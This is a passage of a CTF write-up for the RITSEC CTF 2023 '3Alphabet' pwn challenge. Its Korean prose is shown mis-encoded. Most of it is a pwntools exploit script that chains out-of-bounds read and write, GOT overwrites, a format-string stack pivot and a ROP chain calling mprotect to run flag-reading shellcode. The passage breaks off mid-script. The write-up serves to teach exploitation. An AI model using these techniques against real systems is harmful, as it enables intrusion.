function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>stackê³¼ libc baseë¥¼ êµ¬í•œë‹¤.</li><li>ì§ì ‘ êµ¬í˜„í•œ <code>aaw</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ rop payloadë¥¼ <code>bss</code> ì˜ì—­ì— ì¨ì¤€ë‹¤.</li></ol><ul><li>ì™œ ì´ëŸ° payloadë¥¼ ì¼ëŠ”ì§€ëŠ” ì•„ëž˜ì—ì„œ ì´í•´í•  ìˆ˜ ìžˆë‹¤.  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bssì˜ ì •ì¤‘ì•™</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!)</span></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># ë‘ ë²ˆì§¸ ìŠ¤íƒ í”¼ë´‡íŒ…</span></span><br><span class="line"></span><br><span class="line">aaw(bss, rop_payload) </span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><code>got</code>ë“¤ì„ ë®ì–´ì¤€ë‹¤.</li></ol><ul><li><code>free@got -&gt; printf</code>, <code>__stack_chk_fail@got -&gt; ret</code>, <code>fgets@got -&gt; gets</code></li><li>ì´ë¥¼ ìœ„í•´ bss ì˜ì—­ì— <code>p64(libc.sym[&#39;gets&#39;])</code>, <code>p64(libc.sym[&#39;printf&#39;])</code>, <code>p64(ret)</code>ì„ ì¨ì£¼ì—ˆë‹¤. <code>(!)</code></li><li>gotë¥¼ ë®ì„ ë•ŒëŠ” <code>aaw</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ë°”ë¡œ paylaodë¥¼ ë³´ë‚´ì„œ ë®ì–´ì£¼ì—ˆë‹¤. (ì“¸ í•„ìš”ì„± ëª» ëŠë‚Œ)</li><li>ì™œëƒí•˜ë©´ <code>fgets@got</code>ë¥¼ <code>gets</code> í•¨ìˆ˜ë¡œ ë®ì„ ë•Œ ë§Œì•½ í•œ ë°”ì´íŠ¸ì”© ë®ê²Œ ëœë‹¤ë©´ í•œ ë°”íŠ¸ì”© ë°”ë€ ìž˜ëª»ëœ ì£¼ì†Œë¥¼ í˜¸ì¶œí•˜ê¸° ë•Œë¬¸ì´ë‹¤.</li><li><code>fgets@got -&gt; gets</code> ë®ì„ ë•Œ <code>b&#39;a&#39; * 0x12</code>ì„ ì¶”ê°€ë¡œ ë³´ë‚´ì£¼ì—ˆë‹¤. ì™œëƒí•˜ë©´ <code>free@got</code>ì„ ë®ì–´ì„œ <code>printf</code>ë¡œ ë®ì–´ì„œ fsbê°€ ë°œìƒí•˜ëŠ” ê²ƒì„ ë…¸ë ¸ëŠ”ë°, ë§Œì•½ ì € ë”ë¯¸ë°ì´í„°ë¥¼ ë³´ë‚´ì£¼ì§€ ì•Šìœ¼ë©´ ê¸€ìžìˆ˜ê°€ 17ìžë¡œ <code>fsb</code>ë¡œ ê°’ì„ ì“°ê¸°ì—” í„±ì—†ì´ ë¶€ì¡±í•˜ê¸° ë•Œë¬¸ì— í˜¹ì‹œëª°ë¼ ë”ë¯¸ë°ì´í„°ë„ í•¨ê»˜ ë³´ë‚´ì£¼ì—ˆë‹¤.</li></ul><p>(í˜„ìž¬ ìƒí™©) <code>main</code>í•¨ìˆ˜ì—ì„œ <code>fgets</code> ëŒ€ì‹  <code>gets</code>ê°€ ì‹¤í–‰ë˜ë¯€ë¡œ <code>bof</code>ê°€ í„°ì§! (ì¹´ë‚˜ë¦¬ë•Œë¬¸ì— ì¶”ê°€ì ìœ¼ë¡œ <code>__stack_chk_fail@got</code>ì„ <code>ret</code>ìœ¼ë¡œ ë®ì–´ì¤Œ!) <code>calc_checksum</code> í•¨ìˆ˜ì—ì„œ <code>fgets</code> í•¨ìˆ˜ ëŒ€ì‹  <code>printf</code>ê°€ ì‹¤í–‰ë˜ë¯€ë¡œ <code>fsb</code>ê°€ í„°ì§! </p><ol start="4"><li><code>fsb</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>rbp</code>ë¥¼ ë³€ê²½í•˜ì—¬ íë¦„ì„ <code>bss</code> ì˜ì—­ìœ¼ë¡œ ëŒë¦°ë‹¤. ì´ <code>bss</code> ì˜ì—­ì€ 2ë²ˆì—ì„œ ì ì€ ë¶€ë¶„<code>(!!)</code>ì´ê³  <code>pop_rsp</code>ë¥¼ ì‹¤í–‰í•  ê²ƒì´ë‹¤. (ìŠ¤íƒ í”¼ë´‡íŒ… 1) &lt;- ì°¸ê³ ë¡œ ì—¬ê¸°ì„œ íë¦„ì´ <code>bss</code> ì˜ì—­ìœ¼ë¡œ ë°”ë€Œì–´ì„œ, ì¦‰ <code>rbp</code>ê°€ <code>bss</code> ì˜ì—­ì˜ ì£¼ì†Œë¡œ ë°”ë€Œì–´ì„œ ì¡°ê¸ˆ ì•ˆì¢‹ì€ ì¼ì´ ì¼ì–´ë‚  ìˆ˜ ìžˆë‹¤. ì´ëŠ” ë§¨ ë§ˆì§€ë§‰ì— ì´ì•¼ê¸°í•œë‹¤. <code>***</code>&gt;</li></ol><ul><li><code>fsb</code>ëŠ” <code>calc_checksum</code> í•¨ìˆ˜ì—ì„œ í„°ì§„ë‹¤. ì´ í•¨ìˆ˜ì•ˆì—ì„œì˜ <code>rbp</code>ëŠ” <code>calc_checksum</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ <code>use_packet</code>ì˜ <code>rbp</code>ê°€ ì €ìž¥ëœ ìŠ¤íƒ ì£¼ì†Œì´ë‹¤. </li><li><code>buf</code>ì™€ ìœ„ ìŠ¤íƒ ì£¼ì†Œì˜ offsetì€ 0x90ì´ë‹¤.</li><li><code>0x404820</code>ìœ¼ë¡œ <code>rbp</code>ë¥¼ ë³€ê²½ì‹œí‚¤ê¸° ìœ„í•´ <code>ln</code>ì„ ì´ìš©í•˜ì—¬ <code>0x20</code>ì„ 8 ë°”ì´íŠ¸ ì“°ê³  <code>hn</code>ì„ ì´ìš©í•˜ì—¬ <code>0x4048</code>ì„ 2 ë°”ì´íŠ¸ ì“°ìž.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># ì´ê±¸ ì•ˆí•˜ë©´ calc_checksumì˜ free(printf)ê°€ í˜¸ì¶œì´ ì•ˆë¨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!!)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># ì‹¤í–‰í• ìˆ˜ ìžˆë„ë¡ ê¶Œí•œ ë°”ê¿”ì£¼ê³ </span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># ì—¬ê¸°ì— ì‰˜ì½”ë“œ ìž…ë ¥ í›„</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># ì í”„</span></span><br></pre></td></tr></table></figure></li></ul><ol start="5"><li>ê·¸ëŸ¼ ì´ì œ íë¦„ì´ <code>bss</code> ì˜ì—­ì˜ ì•„ëž˜ ì½”ë“œë¡œ ë°”ë€ŒëŠ”ë°, 4ë²ˆì—ì„œ ìŠ¤íƒì— ì¨ì¤€ ì½”ë“œ<code>(!!!)</code>ë¡œ ì´ë™í•œë‹¤. (ìŠ¤íƒ í”¼ë´‡íŒ… 2)</li><li>ë§ˆì§€ë§‰ìœ¼ë¡œ <code>mprotect</code> í•¨ìˆ˜ë¡œ bss ì˜ì—­ ì‹¤í–‰ê°€ëŠ¥í•˜ê²Œ ì„¤ì •í•´ì£¼ê³  <code>gets</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë‹ˆ <code>flag.txt</code> orwí•˜ëŠ” ì‰˜ì½”ë“œë¥¼ ë³´ë‚´ì£¼ìž.</li></ol><p><code>***</code> <code>calc_checksum</code> í•¨ìˆ˜ì—ì„œ <code>fsb</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>rbp</code>ë¥¼ <code>bss</code>ì˜ì—­ìœ¼ë¡œ ë°”ê¿”ì£¼ì—ˆë‹¤. ì—¬ê¸°ê¹Œì§„ ê´œì°®ì€ë° ê·¸ ë‹¤ìŒ ìž…ë ¥ì—ì„œ ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ë„ ìžˆë‹¤. (ì‹¤ì œë¡œ ë°œìƒí–ˆë‹¤.) ì§€ê¸ˆ íë¦„ ìƒí™©ì—ì„œëŠ” ifë¬¸ ì•ˆìœ¼ë¡œ ë“¤ì–´ê°€ë©´ ì•ˆëœë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="comment">/* ì´ë¯¸ ì§„í–‰ë¨ */</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] <span class="comment">/* ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ê²€ì‚¬*/</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// oob read, write ì·¨ì•½ì ì´ ë°œìƒí•˜ê³  bss ì˜ì—­ì— ê°’ì„ ì”€</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì˜ë„í•˜ì§€ ì•Šì€ ìƒí™©ì´ ë°œìƒí•  ìˆ˜ë„ ìžˆìœ¼ë¯€ë¡œ ìµìŠ¤í•˜ëŠ”ë° í•„ìš”í•˜ì§€ ì•Šì€ ì½”ë“œëŠ” ìµœëŒ€í•œ ì‹¤í–‰ì‹œí‚¤ì§€ ë§ìžëŠ” ìƒê°ì„ ê°€ì ¸ì•¼ í•œë‹¤. ì‚¬ì‹¤ìƒ ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ê²€ì‚¬ëŠ” í‹€ë¦´ ê²ƒì´ê³  ì¤‘ìš”í•œ ê²ƒì€ <code>buf</code>ì™€ <code>len</code>ì„ <code>rbp</code>ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì°¸ì¡°í•˜ê¸° ë•Œë¬¸ì— ìœ„í—˜í•˜ë‹¤. ê·¸ëž˜ì„œ ì•„ëž˜ ë…¸ëž€ìƒ‰ìœ¼ë¡œ ìŒì˜ì§„ ì£¼ì†Œì—ì„œ í„°ì§„ë‹¤.</p><img src="/images/230412-ritsecctf2023-3Alphabet/Screenshot 2023-04-12 at 20.37.20.png" width=500/><br><p>ê·¸ëž˜ì„œ ì‹¤ì œë¡œ í„°ì§„ ì£¼ì†Œ(<code>rbp-0x48</code>)ì—ëŠ” ì ‘ê·¼ ê°€ëŠ¥í•œ ì ë‹¹í•œ ì£¼ì†Œ ë„£ì–´ì£¼ê³  <code>len</code> ì—ëŠ” 1ì„ ë„£ì–´ì¤¬ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf ì•”êº¼ë‚˜</span></span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak stack</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">34</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">info(<span class="built_in">hex</span>(stack)) <span class="comment"># buf address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">250</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write.</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x64f43</span> - <span class="number">0x28000</span>)</span><br><span class="line">libc.address = libc_leak</span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = stack</span><br><span class="line"><span class="comment"># í•œë°”ì´íŠ¸ì”© ìž„ì˜ì“°ê¸°</span></span><br><span class="line"><span class="comment"># addr(ì£¼ì†Œ)ì— val(ê°’)ì„ ì“°ê¸°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawbëŠ” í•œ ë°”ì´íŠ¸ì”© ì¼ì§€ë§Œ aawëŠ” aawbë¥¼ í˜¸ì¶œí•´ì„œ 8ë°”ì´íŠ¸ë¥¼ ì“¸ ê²ƒ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss = 0x4040c0</span></span><br><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bssì˜ ì •ì¤‘ì•™</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rsp = libc.address + <span class="number">0x35732</span></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc.address + <span class="number">0x11f497</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rop_payload += p64(0x4142434445464748)</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># ë‘ ë²ˆì§¸ ìŠ¤íƒ í”¼ë´‡íŒ…</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(bss, rop_payload) <span class="comment"># 0x4040c0:       0x4142434445464748</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $rbp   : 0x000000004040e0  â†’  0x00000042424244 (&quot;DBBB&quot;?)</span></span><br><span class="line"><span class="comment"># 0x401561 &lt;use_packet+132&gt; mov    eax, DWORD PTR [rbp-0x4c] # len</span></span><br><span class="line"><span class="comment"># 0x40156a &lt;use_packet+141&gt; mov    rax, QWORD PTR [rbp-0x48] # buf</span></span><br><span class="line"><span class="comment"># rbpê°€ bss ì˜ì—­ ì£¼ì†Œë¡œ ë°”ë€Œì—ˆê¸° ë•Œë¬¸ì— $rbp-0x4cì™€ $rbp-0x48ì„ ì°¸ì¡°í•˜ë©´ì„œ ì•ˆì¢‹ì€ ì¼ì´ ë°œìƒí•  ìˆ˜ë„ ìžˆìŒ</span></span><br><span class="line"><span class="comment"># ë¯¸ë¦¬ ê°’ì„ ì±„ì›Œì£¼ì–´ ifë¬¸ ì•ˆìœ¼ë¡œ ë“¤ì—‰ê°€ëŠ” ì¼ì´ ì—†ë„ë¡ lenì„ 1ë¡œ ì„¤ì •. ì•„ëž˜ ì‹ì´ falseê°€ ë˜ì–´ì•¼ í•¨.(checksumì€ ê³„ì‚°ëœ ê°’ì´ê¸° ë•Œë¬¸ì— ë†’ì€ í™•ë¥ ë¡œ í‹€ë¦´ ê²ƒ.) ì´ ì „ì˜ ìˆ˜ì‹ì€ ì‹ ê²½ ì•ˆì¨ë„ ë¨. ë¬¸ì œëŠ” calc_checksum ì•ˆì—ì„œ rbpê°€ ë°”ë€Œê¸° ë•Œë¬¸</span></span><br><span class="line"><span class="comment"># calc_checksum(buf, len) == buf[len - 1]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf ì•”êº¼ë‚˜</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"><span class="comment"># got ë®í˜”ëŠ”ì§€ í™•ì¸ -&gt; der $_got()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free@got -&gt; printf</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">8</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;free&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">16</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fgets@got -&gt; gets</span></span><br><span class="line"><span class="comment"># aaw(e.got[&#x27;fgets&#x27;], p64(libc.sym[&#x27;gets&#x27;])) # í•œ ë°”ì´íŠ¸ì”© ë°”ê¾¸ê¸° ë•Œë¬¸ì— í•œ ë°”ì´íŠ¸ì”© ë°”ë€ ì£¼ì†Œë¥¼ í˜¸ì¶œí•¨. ìž˜ëª»ëœ ì£¼ì†Œë¥¼ í˜¸ì¶œí•˜ê¸° ë•Œë¬¸ì— í„°ì§</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> <span class="comment"># &lt;- (!!)</span></span><br><span class="line">payload += 